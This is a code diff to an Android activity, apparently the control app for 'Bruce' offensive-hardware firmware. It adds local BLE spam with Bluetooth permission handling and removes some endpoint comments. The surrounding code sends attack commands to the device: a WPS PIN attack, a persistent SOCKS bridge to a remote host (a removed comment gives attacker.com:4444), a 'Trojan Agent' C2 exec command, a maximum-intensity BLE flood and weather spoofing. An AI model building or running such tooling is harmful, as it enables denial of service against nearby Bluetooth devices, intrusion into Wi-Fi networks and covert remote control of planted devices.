@@ -1,15 +1,33 @@
 package com.example.bruceir
 
+import android.Manifest
+import android.content.pm.PackageManager
+import android.os.Build
 import android.os.Bundle
 import android.widget.*
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
 
 class AdvancedActivity : AppCompatActivity() {
+
+    private lateinit var bleSpamManager: BleSpamManager
+
+    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
+        if (permissions[Manifest.permission.BLUETOOTH_ADVERTISE] == true) {
+            bleSpamManager.startSpam()
+            Toast.makeText(this, "Local BLE Spamming Started (Phone)", Toast.LENGTH_LONG).show()
+        } else {
+            Toast.makeText(this, "Permission denied. Cannot start BLE spam.", Toast.LENGTH_SHORT).show()
+        }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_advanced)
+
+        bleSpamManager = BleSpamManager(this)
 
         val prefs = getSharedPreferences("settings", MODE_PRIVATE)
         val baseUrl = prefs.getString("bruce_url", "http://bruce.local") ?: "http://bruce.local"
@@ -28,7 +46,6 @@ class AdvancedActivity : AppCompatActivity() {
                 return@setOnClickListener
             }
             Thread {
-                // Endpoint firmware: /wifi/wps?pin=12345678
                 val url = "$baseUrl/wifi/wps?pin=$pin"
                 val response = BruceUtils.downloadFileContent(url, user, pass)
                 runOnUiThread {
@@ -55,7 +72,6 @@ class AdvancedActivity : AppCompatActivity() {
             if (host.isEmpty() || port.isEmpty()) return@setOnClickListener
             
             Thread {
-                // Endpoint firmware: /bridge?host=attacker.com&port=4444&socks=true&persist=true
                 val url = "$baseUrl/bridge?host=$host&port=$port&socks=$useSocks&persist=$persistent"
                 val result = BruceUtils.downloadFileContent(url, user, pass)
                 runOnUiThread {
@@ -68,7 +84,6 @@ class AdvancedActivity : AppCompatActivity() {
         // Trojan Agent Dashboard logic
         findViewById<Button>(R.id.btnAgentTrigger).setOnClickListener {
             Thread {
-                // Command to remote Bruce via C2
                 val url = "$baseUrl/bridge/exec?cmd=ir_panic"
                 BruceUtils.downloadFileContent(url, user, pass)
                 runOnUiThread { Toast.makeText(this, getString(R.string.agent_command_sent), Toast.LENGTH_SHORT).show() }
@@ -108,8 +123,6 @@ class AdvancedActivity : AppCompatActivity() {
         }
 
         // BLE Spam Section
-        val bleSpamManager = BleSpamManager()
-
         findViewById<Button>(R.id.btnBleFlood).setOnClickListener {
             Thread {
                 val url = "$baseUrl/ble/spam?mode=all&intensity=max"
@@ -119,6 +132,13 @@ class AdvancedActivity : AppCompatActivity() {
         }
 
         findViewById<Button>(R.id.btnLocalBleSpam).setOnClickListener {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val permissions = mutableListOf(Manifest.permission.BLUETOOTH_ADVERTISE, Manifest.permission.BLUETOOTH_CONNECT)
+                if (permissions.any { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }) {
+                    requestPermissionLauncher.launch(permissions.toTypedArray())
+                    return@setOnClickListener
+                }
+            }
             bleSpamManager.startSpam()
             Toast.makeText(this, "Local BLE Spamming Started (Phone)", Toast.LENGTH_LONG).show()
         }
@@ -133,10 +153,6 @@ class AdvancedActivity : AppCompatActivity() {
         }
 
         // Printer & RF Tools Section
-        findViewById<Button>(R.id.btnOpenScanner).setOnClickListener {
-            startActivity(android.content.Intent(this, NetworkScannerActivity::class.java))
-        }
-
         findViewById<Button>(R.id.btnOpenWeather).setOnClickListener {
             showWeatherSpoofDialog()
         }
